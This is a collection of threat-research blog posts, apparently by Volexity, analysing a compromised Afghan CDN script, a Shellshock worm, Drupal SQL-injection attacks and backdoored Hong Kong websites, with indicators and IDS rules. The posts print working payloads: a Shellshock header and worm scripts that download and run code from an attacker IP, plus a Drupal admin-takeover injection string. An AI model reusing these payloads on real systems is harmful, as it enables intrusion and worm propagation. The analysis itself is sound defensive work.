<p>In a previous attack highlighted earlier in the year by <a href=""http://www.threatconnect.com/news/operation-poisoned-helmand/"">ThreatConnect</a>. One of the two primary Javascript files accessed from the CDN system was modified to load code from two different malicious URLs. In the past attacks, the following file was modified to load unwanted Javascript:</p>
<blockquote><p><span style=""color: #226cbf;""> http://cdn.afghanistan.af/scripts/gop-script.js</span></p></blockquote>
<p>In these instances the offending code was easily identifiable, as the attackers simply prepended document.write statements to the very top of the gop-script.js file as seen below:</p>
<p><a href=""http://www.volexity.com/blog/wp-content/uploads/2015/06/cdn_afghanistan_comp12.png""><img alt=""cdn_afghanistan_comp1"" class=""alignnone wp-image-143"" height=""42"" src=""http://www.volexity.com/blog/wp-content/uploads/2015/06/cdn_afghanistan_comp12.png"" width=""730"" /></a></p>
<p>However, this new round of malicious code has two primary differences. The first difference is the attackers chose to modify a different file in this round. The offending code is no longer present in gop-script.js, as this file was cleaned up some time ago. However, malicious code is now found in the following Javascript code on the Afghan CDN website:</p>
<blockquote><p><span style=""color: #226cbf;""> http://cdn.afghanistan.af/scripts/jquery-1.4.2.min.js</span></p></blockquote>
<p>The next major difference is the attackers went through more of an effort to obfuscate their activity by appending their code to the end of the file and by leveraging the <a href=""http://dean.edwards.name/packer/"">Dean Edwards Packer</a> with base62 encoding. In this instance, the packer effectively makes it more difficult to discern exactly what the attackers have done just by looking at the code. The image below shows the malicious code as it currently appears within the jquery-1.4.2.min.js file:</p>
<p><a href=""http://www.volexity.com/blog/wp-content/uploads/2015/06/cdn_afghanistan_jquery4.png""><img alt=""cdn_afghanistan_jquery"" class=""alignnone wp-image-144"" height=""100"" src=""http://www.volexity.com/blog/wp-content/uploads/2015/06/cdn_afghanistan_jquery4.png"" width=""998"" /></a></p>
<p>Taking this Javascript and unpacking it results in a bit more recognizable code (note we have modified http to hxxp below):</p>
<blockquote><p><span style=""color: #3366ff;"">document.write(&#8216;&lt;script type=&#8221;text/javascript&#8221; src=\&#8221;hxxp://176.58.101.24/Jquery/Jquery.js\&#8221;&gt;&lt;/script&gt;&#8217;</span>);</p></blockquote>
<p>This code will cause a visitor to attempt to retrieve Javascript from the Linode IP address <strong>176.58.101.24</strong> and load it into the browser.</p>
<h2>Selective Exploitation</h2>
<p>One of the more interesting tactics that APT attackers have been employing in recent years is the usage of IP address whitelisting. Volexity believes that the attackers behind the Afghan Government compromise likely have a specific set of targets that are potential recipients of malicious code via the 176.58.101.24 address. In all observed instances thus far, only HTTP 403 (Forbidden) responses have been observed. This threat group has used similar tactics on other websites involved in strategic web compromises in the past as well. The only real way to identify the targets is to observe the code actually being seen, or see the whitelist from the server itself. At this point we can only speculate that Government and Defense entities are likely the intended targets of this campaign. If you check your logs and find HTTP 200 results, we would like to hear from you.</p>
<h2>Network Indicators</h2>
<p>The most straightforward and primary network indicator at this time is looking for for communication with the IP address 176.58.101.24. ASN details via the <a href=""https://www.shadowserver.org/wiki/pmwiki.php/Services/IP-BGP"">Shadowserver IP-BGP</a> service are shown below.</p>
<blockquote><p>$ whois -h asn.shadowserver.org &#8216;origin 176.58.101.24&#8217;<br />
15830 | 176.58.96.0/19 | TELECITY | GB | linode.com | Linode LLC</p></blockquote>
<p>&nbsp;</p>",https://www.volexity.com/blog/2015/06/12/afghan-government-compromise-browser-beware/
A New Shellshock Worm on the Loose,"<p>In a blog post from September last year, we described some of the <a href=""http://www.volexity.com/blog/?p=19"">early Shellshock</a> activity we were seeing in the wild. Since then we have continued to observe periodic scanning, which have by in large not been particularly noteworthy. That remained the case until just a little bit ago. Starting late in the afternoon on April 8, 2015, the frequency and breadth of scanning observed by Volexity increased fairly dramatically. A closer look at the activity reveals that a worm (of sorts) has been set loose on the Internet looking for vulnerable hosts to exploit over HTTP.</p>
<p>The inbound requests that have been observed look like this:</p>
<blockquote>
<p style=""padding-left: 30px;"">GET HTTP/1.1 HTTP/1.1<br />
Accept: */*<br />
Accept-Language: en-us<br />
Accept-Encoding: gzip, deflate<br />
User-Agent: () { :;};/usr/bin/perl -e &#8216;print &#8220;Content-Type: text/plain\r\n\r\nXSUCCESS!&#8221;;system(&#8220;cd /tmp;cd /var/tmp;rm -rf .c.txt;rm -rf .d.txt ; wget http://109.228.25.87/.c.txt ; curl -O http://109.228.25.87/.c.txt ; fetch http://109.228.25.87/.c.txt ; lwp-download http://109.228.25.87/.c.txt; chmod +x .c.txt* ; sh .c.txt* &#8220;);&#8217;<br />
Host: &lt;ip address&gt;<br />
Connection: Close</p>
</blockquote>
<p>The first request contains a double HTTP/1.1 header. The Shellshock exploit attempt then comes via the User-Agent string. The attacking systems attempt the exploit against the following file paths on the targeted system (in this order):</p>
<blockquote>
<p style=""padding-left: 30px;"">/cgi-bin/php<br />
/<br />
/cgi-bin/bash<br />
/cgi-bin/contact.cgi<br />
/cgi-bin/defaultwebpage.cgi<br />
/cgi-bin/env.cgi<br />
/cgi-bin/fire.cgi<br />
/cgi-bin/forum.cgi<br />
/cgi-bin/hello.cgi<br />
/cgi-bin/index.cgi<br />
/cgi-bin/login.cgi<br />
/cgi-bin/main.cgi<br />
/cgi-bin/meme.cgi<br />
/cgi-bin/php4<br />
/cgi-bin/php5<br />
/cgi-bin/php5-cli<br />
/cgi-bin/recent.cgi<br />
/cgi-bin/sat-ir-web.pl<br />
/cgi-bin-sdb/printenv<br />
/cgi-bin/test-cgi<br />
/cgi-bin/test.cgi<br />
/cgi-bin/test-cgi.pl<br />
/cgi-bin/test.sh<br />
/cgi-bin/tools/tools.pl<br />
/cgi-mod/index.cgi<br />
/cgi-sys/defaultwebpage.cgi<br />
/cgi-sys/entropysearch.cgi<br />
/cgi-sys/php5</p>
</blockquote>
<p>If successful, the exploit attempts to perform the following actions:</p>
<ul>
<li>Print &#8220;XSUCCESS!&#8221; back to the source system.</li>
<li>Change to a temporary directory on the system (/tmp or /var/tmp)</li>
<li>Remove any existing files named .c.txt and .d.txt</li>
<li>Download the file .c.txt from 109.228.25.87 using wget, curl, fetch, and lwp-download</li>
<li>Change the access permissions to the file .c.txt or any file starting with .c.txt in the directory in order to make it executable</li>
<li>Execute the file .c.txt or any file in the directory starting with .c.txt</li>
</ul>
<p>Now, a further look at the file .c.txt shows it has the following contents:</p>
<blockquote>
<p style=""padding-left: 30px;"">rm -rf /tmp/* /tmp/.* &amp;<br />
rm -rf /var/tmp/* /var/tmp/.* &amp;<br />
cd /var/tmp/<br />
cd /tmp<br />
killall -9 scan brute f b r print pscan pnscan ps minerd &amp;<br />
sleep 10<br />
wget http://109.228.25.87/.ips-80/cc.tar<br />
curl -O http://109.228.25.87/.ips-80/cc.tar<br />
sleep 5<br />
tar xvf cc.tar<br />
tar zxvf cc.tar<br />
tar xvf  cc.tar.1<br />
tar zxvf cc.tar.1<br />
tar xzvf cc.tar<br />
tar xzvf cc.tar.1<br />
sleep 10<br />
cd .cc<br />
chmod +x *<br />
nohup ./r &amp;</p>
<p style=""padding-left: 30px;"">
</blockquote>
<p>After performing a few tasks, the script will download a tarball file from <strong>http://109.228.25.87/.ips-80/cc.tar</strong>.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> cc.tar<br />
<strong>File size:</strong> 51200 bytes<br />
<strong>MD5 hash:</strong> 4d56cf72a5e9a64cffce2489f0c83a47<br />
<strong>SHA1 hash:</strong> 826c881d0787f11f4acb7d3b27905c47d8e8d5b3<br />
<strong>Notes: </strong>Tarball containing scripts and 32-bit and 64-bit scanning binaries.</p>
<p>Within this tarball file are the following files:</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> cgiscan32<br />
<strong>File size:</strong> 12685 bytes<br />
<strong>MD5 hash:</strong> b3f9345a6e2de5348645e8060ad1c8a9<br />
<strong>SHA1 hash:</strong> d669bca815f44d54d81ba523ccfd187529394ee7<br />
<strong>Notes: </strong>32-bit ELF scanning binary (compiled sslvuln.c)</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> cgiscan64<br />
<strong>File size:</strong> 15083 bytes<br />
<strong>MD5 hash:</strong> 20fa3835528a5f28907dea9123117b02<br />
<strong>SHA1 hash:</strong> a8ec2eb582c7011aee5c90ec0dcf5b48e7d14b5e<br />
<strong>Notes: </strong>64-bit ELF scanning binary (compiled sslvuln.c)</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> patch<br />
<strong>File size:</strong> 556 bytes<br />
<strong>MD5 hash:</strong> 23ea9aed18bdef6ef5efee3b5fbdde0c<br />
<strong>SHA1 hash:</strong> 8062ef8840b5664e0c58e83224a68ba283b38aac<br />
<strong>Notes: </strong>Text file with file paths to be scanned for Shellshock vulnerability.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> paths<br />
<strong>File size:</strong> 556 bytes<br />
<strong>MD5 hash:</strong> 23ea9aed18bdef6ef5efee3b5fbdde0c<br />
<strong>SHA1 hash:</strong> 8062ef8840b5664e0c58e83224a68ba283b38aac<br />
<strong>Notes: </strong>Text file with file paths to be scanned for Shellshock vulnerability. Same file as &#8220;patch&#8221;.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> print<br />
<strong>File size:</strong> 490 bytes<br />
<strong>MD5 hash:</strong> eba7062843a4161907758112f78642c6<br />
<strong>SHA1 hash:</strong> dd411e6307f8142a8b67173748e4a46c8a2af654<br />
<strong>Notes: </strong>Script used for reporting back IP addresses found to be vulnerable with Shellshock.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> r<br />
<strong>File size:</strong> 5463 bytes<br />
<strong>MD5 hash:</strong> a15666421a3d34064bbb18a3449f1406<br />
<strong>SHA1 hash:</strong> 586de34a05c09f235c61da9f0d54ec53d7c277ac<br />
<strong>Notes: </strong>Script used to feed the &#8220;start&#8221; script file paths to be downloaded that contain blocks of IP addresses to be scanned.</p>
<p style=""padding-left: 30px;""><strong>Filename:</strong> start<br />
<strong>File size:</strong> 437 bytes<br />
<strong>MD5 hash:</strong> 62d07f41433c67e1120cd9e9a00135c5<br />
<strong>SHA1 hash:</strong> f10e0a29e5f9e6cf21fbce04fe96eacb780e8b29<br />
<strong>Notes: </strong>Script that initiates all IP range downloads, scanning, saving of vulnerable hosts, and then launches &#8220;print&#8221; to report back.</p>
<h2>Attack Initiation</h2>
<p>As can be seen from the file .c.txt, the last thing it does is launch the file <strong>r</strong>. The file r is a bash script which feeds another bash script, <strong>start</strong>, three letters as a parameter. The full contents of the file <strong>start</strong> are shown below:</p>
<blockquote>
<p style=""padding-left: 30px;"">#!/bin/bash<br />
############### Config ###############<br />
rm -rf scan.log<br />
rm -rf vuln-ip.txt</p>
<p>wget http://109.228.25.87/.ips-80/$1<br />
curl -O http://109.228.25.87/.ips-80//$1<br />
fetch http://109.228.25.87/.ips-80/$1</p>
<p>cat $1* |sort -u &gt;&gt; scan.log<br />
rm -rf $1*<br />
sleep 1</p>
<p>if [ `getconf LONG_BIT` = &#8220;64&#8221; ]<br />
then<br />
./cgiscan64 scan.log v 50 patch<br />
else<br />
./cgiscan32 scan.log v 50 patch<br />
fi</p>
<p>sleep 60<br />
rm -rf t.log<br />
cat vuln-ip.txt | sort -u &gt;t.log<br />
sleep 4<br />
./print</p></blockquote>
<p>&nbsp;</p>
<p>As you can see, the first thing the script does is try to remove any existing copies of scan.log and vuln-ip.txt. After that, it then tries to download the file that was fed to it from the r script. It then appends the contents of the download to the file scan.log and removes the initial file. An example download of one such file would be from the URL <strong>http://109.228.25.87/.ips-80/xxx</strong>. That &#8220;xxx&#8221; is not a placeholder, that is an actual file on the server. The file &#8220;xxx&#8221; contains 26,356 IP addresses and starts with the IP 98.1.153.231 and ends with 98.120.200.16. Each of the various file chunks contain tens of thousands of IP addresses to be used for scanning.</p>
<p>The script then launches either the 32-bit or 64-bit version of an ELF scanning binary. Based on the contents of the file, it appears to be a modified version of a file called mass.c referenced as sslvuln.c that was found on a Romanian website. Notable strings in the binaries include:</p>
<blockquote><p>GET %s%s HTTP/1.1<br />
Accept: */*<br />
Accept-Language: en-us<br />
Accept-Encoding: gzip, deflate<br />
User-Agent: () { :;};/usr/bin/perl -e &#8216;print &#8220;Content-Type: text/plain\r\n\r\nXSUCCESS!&#8221;;system(&#8220;cd /tmp;cd /var/tmp;rm -rf .c.txt;rm -rf .d.txt ; wget http://109.228.25.87/.c.txt ; curl -O http://109.228.25.87/.c.txt ; fetch http://109.228.25.87/.c.txt ; lwp-download http://109.228.25.87/.c.txt; chmod +x .c.txt* ; sh .c.txt* &#8220;);&#8217;<br />
Host: %s<br />
Connection: Close</p>
<p>Nu Pot Deschide %s</p>
<p>vuln-tot.txt</p>
<p>vuln-ip.txt</p></blockquote>
<p>As you can see, the binaries have the Shellshock download site we have observed embedded into the linux binaries. As a result, all systems that are successfully exploited then repeat the process that was just observed and effectively become part of the scanning/worm network. The cgiscan binaries log all vulnerable hosts they find to a file named <strong>vuln-ip.txt</strong>. Finally, at the end of the <strong>start</strong> script, once the current scanning activity has completed, it sorts, removes any duplicate entries, and stores all discovered vulnerable hosts into a file named <strong>t.log</strong> and launches another bash script named <strong>print</strong>. The full contents of the <strong>print </strong>bash script are shown below:</p>
<p>&nbsp;</p>
<blockquote><p>#!/bin/bash</p>
<p>if which wget &gt;/dev/null; then</p>
<p>for i in `cat t.log|sort|uniq`<br />
do<br />
wget -O .tmp http://109.228.25.87/.c.php?request=&#8221;$i&#8221; &amp;&gt;/dev/null&amp;<br />
done<br />
else</p>
<p>if which curl &gt;/dev/null; then</p>
<p>for i in `cat t.log|sort|uniq`<br />
do<br />
curl -O http://109.228.25.87/.c.php?request=&#8221;$i&#8221; &amp;&gt;/dev/null&amp;<br />
rm -rf $i<br />
done<br />
else</p>
<p>if which fetch &gt;/dev/null; then</p>
<p>for i in `cat t.log|sort|uniq`<br />
do<br />
curl -O http://109.228.25.87/.c.php?request=&#8221;$i&#8221; &amp;&gt;/dev/null&amp;<br />
rm -rf $i<br />
done</p>
<p>fi</p>
<p>fi</p>
<p>fi</p>
<p>sleep 1</p></blockquote>
<p>&nbsp;</p>
<p>The script enumerates through the list of vulnerable hosts recorded in the file <strong>t.log</strong> and reports them back to the attacker&#8217;s server at <strong>109.228.25.87</strong> via the file <strong>.c.php</strong> by placing the IP address as a value to the <strong>request=</strong> URI parameter. This allows the attackers to maintain a list of systems that are vulnerable that they have managed to compromise.</p>
<h2>Network Indicators</h2>
<p>The most solid network indicator at this time is looking for any sort of outbound communication with the IP address 109.228.25.87. Utilizing the Shadowserver ASN lookup service, we see this system resides on an IP address at Fast Hosts Ltd.</p>
<blockquote><p>$ whois -h asn.shadowserver.org &#8216;origin 109.228.25.87&#8217;<br />
8560 | 109.228.0.0/18 | ONEANDONE | DE | fasthosts.com | Fast Hosts Ltd</p></blockquote>
<p>Additionally, signatures can be leveraged with an IDS to look for the requests as well. Simple signatures that can be leveraged is shown below:</p>
<h3><span style=""color: #0000ff;"">Suricata Format</span></h3>
<blockquote><p>alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&#8221;Volex &#8211; Possible Shellshock Worm Check-in Detected&#8221;; flow:established,to_server; content:&#8221;.c.php?request=&#8221;; http_uri;  sid:2015040901;)</p></blockquote>
<h3><span style=""color: #0000ff;"">Snort Format</span></h3>
<blockquote><p>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:&#8221;Volex &#8211; Possible Shellshock Worm Check-in Detected&#8221;; flow:established,to_server; content:&#8221;.c.php?request=&#8221;; http_uri;  sid:2015040901;)</p></blockquote>
<p>These signatures can be made more broad to just look for &#8220;.php?request=&#8221; and alternatively can be made more restrictive by adding a pcre check for an IP address as part of the URI (/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/).</p>
<p>&nbsp;</p>
<h2>A Long Story Short</h2>
<p>To make a long story short, you should know there is a Shellshock worm, of sorts, going around again. Compromised systems are being added to the network of systems that are scanning for more vulnerable systems. This process is continuing to repeat. The &#8220;worm&#8221; requires that 109.228.25.87 be online for the files to be downloaded. However, even if this system goes offline, the attackers have still likely compiled a list of vulnerable systems through download logs and the check-in URL where scanning systems further report other vulnerable hosts they have discovered. It is recommended that you actively monitor for connections to 109.228.25.87. If you see traffic going there, you will likely need to deal with a multitude of malware on a system that has likely been compromised several times as a result of the Shellshock vulnerability.</p>
<p>&nbsp;</p>
<p><strong>Update 2015-04-09 12:14 UTC </strong></p>
<p>The malicious files housed at 109.228.25.87 appear to have been taken down and scanning activity appears to have slowed down fairly dramatically.</p>",https://www.volexity.com/blog/2015/04/09/a-new-shellshock-worm-on-the-loose/
Drupal Vulnerability: Mass Scans & Targeted Exploitation,"<p>Yesterday (October 15, 2014), a critical SQL injection vulnerability in version 7 of the popular open source content management system (CMS) <a href=""http://www.drupal.org"">Drupal</a> was disclosed by Stefan Horst and detailed in <a href=""https://www.drupal.org/SA-CORE-2014-005"">SA-CORE-2014-005</a>. The description of the vulnerability is rather harrowing:</p>
<blockquote><p>Drupal 7 includes a database abstraction API to ensure that queries executed against the database are sanitized to prevent SQL injection attacks.</p>
<p>A vulnerability in this API allows an attacker to send specially crafted requests resulting in arbitrary SQL execution. Depending on the content of the requests this can lead to privilege escalation, arbitrary PHP execution, or other attacks.</p>
<p>This vulnerability can be exploited by anonymous users.</p></blockquote>
<p>If you think this sounds pretty bad, you are spot on. Along with the advisory, a patch was released to fix the security issue. Unfortunately, patches are also often leveraged to identify exactly how to exploit such vulnerabilities. In this case, it was only hours later that PoC code on how to exploit the security issue was posted online. From that point it, has been off to the races by attackers. The first such instance of the code appearing that we have seen was on Reddit by the user <a href=""https://www.reddit.com/user/fyukyuk"">fyukyuk</a>. Not long after, someone further weaponized the code into a Python script and posted it to Pastebin <a href=""http://pastebin.com/nDwLFV3v"">here</a>.</p>
<p>The following is the excerpt of the code that would need to be sent in a POST request to facilitate the SQL injection from fyukyuk&#8217;s example on Reddit:</p>
<blockquote><p><code>name[0%20;update+users+set+name%3d'owned'+,+pass+%3d+'$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld'+where+uid+%3d+'1';;#%20%20]=test3&amp;name[0]=test&amp;pass=shit2&amp;test2=test&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in</code></p></blockquote>
<p>If this code is executed properly on Drupal, it effectively updates the the account with the uid of 1 (admin) and sets the new username to &#8220;owned&#8221;. The password is then set to &#8220;thanks&#8221; and those credentials could then potentially be used to access Drupal as an administrator. We say potentially because there are other mitigating steps one could enact to prevent access, such as ACLs and two-factor authentication. However, given the scope of the vulnerability includes remote code execution, restricting access to the Drupal admin interface may be the least of one&#8217;s worries.</p>
<h2>Targeted Attacks and Mass Scans in the Wild</h2>
<p>Now, here is the bad news. Not only has the PoC code been online since October 15, attackers have also been mass scanning for this issue since then as well. We are aware of multiple confirmed breaches at various organizations as a result. Volexity has observed attacks against several of its customers in both indiscriminate and targeted capacities. Wide spread scanning has been observed against websites that are not even hosting Drupal. However, Volexity has also observed IP addresses associated with APT attackers specifically targeting websites of our customers.</p>
<p>In the cases where we have had packet capture to fully analyze the contents of the attacks, we have observed the attackers using the exact PoC code that has been posted online without changing it. The following HTTP Request was captured late last night from an attack on a patched Drupal server:</p>
<blockquote><p>POST /?q=node&amp;destination=node HTTP/1.1<br />
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:29.0) Gecko/20100101 Firefox/29.0<br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3<br />
Content-Type: application/x-www-form-urlencoded<br />
Content-Length: 253<br />
Host: &lt;removed&gt;<br />
Connection: keep-alive</p>
<p>name[0%20;update%2Busers%2Bset%2Bname%3d&#8217;owned&#8217;%2B,%2Bpass%2B%3d%2B&#8217;$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld&#8217;%2Bwhere%2Buid%2B%3d%2B&#8217;1&#8242;;;#%20%20]=test3&amp;name[0]=test&amp;pass=shit2&amp;test2=test&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log%2Bin</p></blockquote>
<p>In this case, the attack appears to have been manual. Further examination of other log data available to Volexity has shown mass scanning with a variety of User-Agents being leveraged as well. So far, scans with the following User-Agents have been observed:</p>
<blockquote><p>Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)<br />
Mozilla/5.0 (Windows NT 5.2; rv:25.0) Gecko/20100101 Firefox/25.0<br />
Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20130101 Firefox/10.0<br />
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101<br />
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:28.0) Gecko/20100101<br />
Python-urllib/2.6<br />
Python-urllib/2.7</p></blockquote>
<h2>Version Reconnaissance &#8211; CHANGELOG.txt</h2>
<p>In some of the targeted cases Volexity has observed thus far, the attackers requested a file that is often a remnant from Drupal installs and upgrades called <strong>CHANGELOG.txt</strong>. This file details the changes that have been made to Drupal with each release. More importantly is that above each set of changes is the version number in which they were made. If the file is left behind, the very first line will reveal what version of Drupal the server is running. In two cases Volexity observed the attackers requesting this file from the target server. In one case, the attackers did it prior to attempting their exploit. In the other they did it post exploit attempt. In both cases, the exploit failed as the server was patched yesterday afternoon. Volexity would recommend removing this file. The text below contains partial content from CHANGELOG.txt showing the patches and version number as observed on a Drupal 7 server:</p>
<blockquote>
<pre>Drupal 7.31, 2014-08-06
----------------------
- Fixed security issues (denial of service). See SA-CORE-2014-004.

Drupal 7.30, 2014-07-24
-----------------------
- Fixed a regression introduced in Drupal 7.29 that caused files or images
  attached to taxonomy terms to be deleted when the taxonomy term was edited
  and resaved (and other related bugs with contributed and custom modules).
- Added a warning on the permissions page to recommend restricting access to
  the ""View site reports"" permission to trusted administrators. See
  DRUPAL-PSA-2014-002.
- Numerous API documentation improvements.
- Additional automated test coverage.</pre>
</blockquote>
<h2>Detection</h2>
<p>Depending on what type of data you have to work with, there are various means to detect attacks. If you have access to web logs, you can grep them for the following text:</p>
<blockquote><p><strong>?q=node&amp;destination=node</strong></p></blockquote>
<p>Results similar to the following may represent exploitation attempts:</p>
<blockquote><p>119.57.189.115, 119.57.189.115 &#8211; &#8211; [16/Oct/2014:04:15:15 -0500] &#8220;POST //?q=node&amp;destination=node HTTP/1.1&#8221; 200 &#8220;-&#8221; &#8220;Python-urllib/2.7&#8221;</p></blockquote>
<p>This isn&#8217;t to say there aren&#8217;t other ways to encode the URLs and URI data, but it is what is currently prevalent.</p>
<p>Additionally, the following Suricata and Snort rules can be leveraged to detect the current round of attacks:</p>
<h3><span style=""color: #3366ff;"">Suricata Format</span></h3>
<blockquote><p>alert http $EXTERNAL_NET any -&gt; $HOME_NET any (msg:&#8221;Volexity &#8211; Possible Drupal SA-CORE-2014-005 Exploit Attempt&#8221;; flow:established,to_server; content:&#8221;POST&#8221;; http_method; content:&#8221;?q=node&amp;destination=node&#8221;; http_uri; content:&#8221;name[0%20|3b|update&#8221;; http_client_body;  threshold:type limit, track by_src, count 1, seconds 120; sid:2014101601;)</p></blockquote>
<h3><span style=""color: #3366ff;"">Snort Format</span></h3>
<blockquote><p>alert tcp $EXTERNAL_NET any -&gt; $HOME_NET $HTT_PORTS (msg:&#8221;Volexity &#8211; Possible Drupal SA-CORE-2014-005 Exploit Attempt&#8221;; flow:established,to_server; content:&#8221;POST&#8221;; http_method; content:&#8221;?q=node&amp;destination=node&#8221;; http_uri; content:&#8221;name[0%20|3b|update&#8221;; http_client_body;  threshold:type limit, track by_src, count 1, seconds 120; sid:2014101601;)</p></blockquote>
<p>These signatures are specific to what is being seen in the wild and will not detect all possible cases of such an attack. A more loose version of these rules could involve only examining the http_uri and removing the following content match.</p>
<h2>Conclusion</h2>
<p>The most important thing to do, if you haven&#8217;t already, is to patch immediately. Then examine your system, database, and logs to see if you have already been impacted. If you can&#8217;t log into your admin account any longer and see the account name is now &#8216;owned&#8217;, then you have already been compromised. However, this is just the cookie cutter in the wild exploit being used. Attackers can perform any number of other functions with this exploit and are not limited to what we have described thus far. If you have been breached or have major concerns that you have been, it may be time to build a new server and start with a fresh system build and the latest version of Drupal. Consider restricting access to your user and administrative interfaces and consider two-factor authentication integration from providers like <a href=""https://www.duosecurity.com/docs/drupal"">Duo Security</a>. Also, while you are at it, go ahead and delete CHANGELOG.txt.</p>
<p>&nbsp;</p>",https://www.volexity.com/blog/2014/10/16/drupal-vulnerability-mass-scans-targeted-exploitation/
Democracy in Hong Kong Under Attack,"<p>Over the last few months, Volexity has been tracking a particularly remarkable advanced persistent threat (APT) operation involving strategic web compromises of websites in Hong Kong and Japan. In both countries, the compromised websites have been particularly notable for their relevance to current events and the high profile nature of the organizations involved. In particular the Hong Kong compromises appear to come on the heels of the <a href=""https://en.wikipedia.org/wiki/Occupy_Central_with_Love_and_Peace""><strong>Occupy Central Campaign</strong></a> shifting into high gear. These compromises were discovered following the identification of malicious JavaScript that had been added to legitimate code on the impacted websites. This code meant that visitors were potentially subjected to exploit and malicious Java Applets designed to install malware on their systems. While investigating these cases, Volexity also discovered additional APT attack campaigns involving multiple other pro-democratic websites in Hong Kong. These attempts at exploitation, compromise, and digital surveillance are detailed throughout this post.</p>
<h2>Compromised Pro-Democratic Hong Kong Websites</h2>
<p><span style=""text-decoration: underline;""><span style=""color: #ff0000; text-decoration: underline;"">Warning: Many of these websites may still be compromised and present a risk to visitors. Browse with caution.</span></span></p>
<h4><span style=""color: #003366;""><strong><span style=""text-decoration: underline;"">Alliance for True Democracy &#8211; Hong Kong</span></strong></span></h4>
<p>Over the last two days, Volexity has observed malicious code being served up from the website of the Alliance for True Democracy (ATD) in Hong Kong (www.atd.hk). ATD is an alliance of people and organizations dedicated to democracy and universal suffrage in Hong Kong. At the time of this writing malicious code is still live on the website, so please visit with care until the website is clean. Below is a screen shot of the malicious code references found pre-pended to a JavaScript file on the website named<strong> superfish.js</strong>.</p>
<p style=""padding-left: 30px;""><a href=""http://www.volexity.com/blog/wp-content/uploads/2014/10/atd-superfish.js-small1.png""><img alt=""atd-superfish.js-small"" class=""alignnone size-full wp-image-37"" height=""202"" src=""http://www.volexity.com/blog/wp-content/uploads/2014/10/atd-superfish.js-small1.png"" width=""745"" /></a></p>
<p>This JavaScript file is called from other parts of the website and effectively nests the loading of additional JavaScript written and interpeted as:</p>
<blockquote><p><strong>&lt;script language=javascript src=http://java-se.com/o.js&lt;/script&gt;</strong></p></blockquote>
<p>The domain name <strong>java-se.com </strong>is known bad and associated with APT activity. At the time of this post, the domain is hosted on the Japanese IP address <strong>210.253.101.105</strong>.</p>
<blockquote><p>7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC.</p></blockquote>
<p>Volexity has yet to actually see the contents of the file o.js, as the websites has continuously returned HTTP 403 responses each time it was requested. The file was requested from IP addresses throughout Asia without ever returning valid content. It&#8217;s unclear if this code is activated at certain times or if there is a whitelist of IPs restricting access to the file to specific targets. This same code has also been observed being served from another Hong Kong website described in the next section.</p>
<h4>Webshell Backdoor</h4>
<p>While examining the ATD website, Volexity also observed that the site had a password protected backdoor webshell placed on it. This is a fairly popular webshell that Volexity has encountered on several occasions when dealing with website compromises. Volexity refers to this shell as the Angel Webshell, named after its default password of &#8220;angel&#8221;. The shell will simply display the text &#8220;Password:&#8221;, a text input box, and a Login button. A screen shot of the webshell as observed on the ATD website can be seen below.</p>
<p style=""padding-left: 30px;""><a href=""http://www.volexity.com/blog/wp-content/uploads/2014/10/atd-angel-shell.png""><img alt=""atd-angel-shell"" class=""alignnone size-full wp-image-70"" height=""76"" src=""http://www.volexity.com/blog/wp-content/uploads/2014/10/atd-angel-shell.png"" width=""392"" /></a></p>
<p>Despite the shell being written in PHP and only displaying a simple Login prompt, it is easy to identify the Angel webshell based on unique components of its viewable HTML source code. The HTML source of this page is displayed in the following image.</p>
<p style=""padding-left: 30px;""><a href=""http://www.volexity.com/blog/wp-content/uploads/2014/10/atd-angel-shell-src.png""><img alt=""atd-angel-shell-src"" class=""alignnone size-full wp-image-71"" height=""117"" src=""http://www.volexity.com/blog/wp-content/uploads/2014/10/atd-angel-shell-src.png"" width=""758"" /></a></p>
<p>While Volexity operates under the assumption attackers have placed webshells on webservers they have compromised, in this particular instance it can be seen with certainty. Attackers will often upload new webshells or add simple China Chopper style modifications to legitimate existing files in an attempt to maintain persistence to these systems.</p>
<h4><span style=""color: #003366;""><strong><span style=""text-decoration: underline;"">Democratic Party Hong Kong<br />
</span></strong></span></h4>
<p>In the last week, Volexity also observed both the English and Chinese language websites for the Democratic Party Hong Kong compromised with the same malicious code found ont he ATD website (www.dphk.org | eng.dphk.org). DPHK is a pro-democracy political party in Hong Kong. Like the ATD website, at the time of this writing the DPHK websites are also serving up malicious code, so please browse with caution. During our research for this post, we also became aware of multiple public reports related to the compromise of the DPHK website on both Twitter and via ThreatConnect. Our good friend Claudio Guarnieri posted the <a href=""https://twitter.com/botherder/status/517994402158227456"">following tweet</a> on October 3, 2014</p>
<blockquote><p>The website of the Democratic Party of Hong Kong has been compromised and still is. Let them know. <a class=""twitter-hashtag pretty-link js-nav"" dir=""ltr"" href=""https://twitter.com/hashtag/OccupyCentral?src=hash""><s>#</s><b>OccupyCentral</b></a></p></blockquote>
